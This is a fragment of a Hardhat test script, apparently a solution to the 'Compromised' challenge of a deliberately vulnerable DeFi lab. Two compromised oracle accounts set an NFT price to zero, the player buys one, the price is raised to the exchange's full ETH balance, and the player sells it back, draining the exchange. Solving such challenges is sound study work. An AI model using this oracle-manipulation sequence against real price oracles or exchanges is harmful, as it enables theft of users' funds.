...
describe('Compromised challenge', function () {
    ...
    it('Execution', async function () {
        ...
        // console.log(oracle1)
        // console.log(oracle2)
        var tokenName = await nftToken.symbol()
        console.log(await oracle.connect(oracle1).postPrice(tokenName, 0))
        console.log(await oracle.connect(oracle2).postPrice(tokenName, 0))
        console.log(await oracle.getAllPricesForSymbol(tokenName))
        console.log(await exchange.connect(player).buyOne({value: 1}))
        console.log(await oracle.connect(oracle1).postPrice(tokenName, EXCHANGE_INITIAL_ETH_BALANCE))
        console.log(await oracle.connect(oracle2).postPrice(tokenName, EXCHANGE_INITIAL_ETH_BALANCE))       
        // console.log(await exchange.connect(player).sellOne())        
        console.log("==================================================")
        const token_id = (await nftToken.tokenIdCounter()) -1
        console.log(token_id)
        await nftToken.connect(player).approve(exchange.address, token_id)
        console.log(await exchange.connect(player).sellOne(token_id))
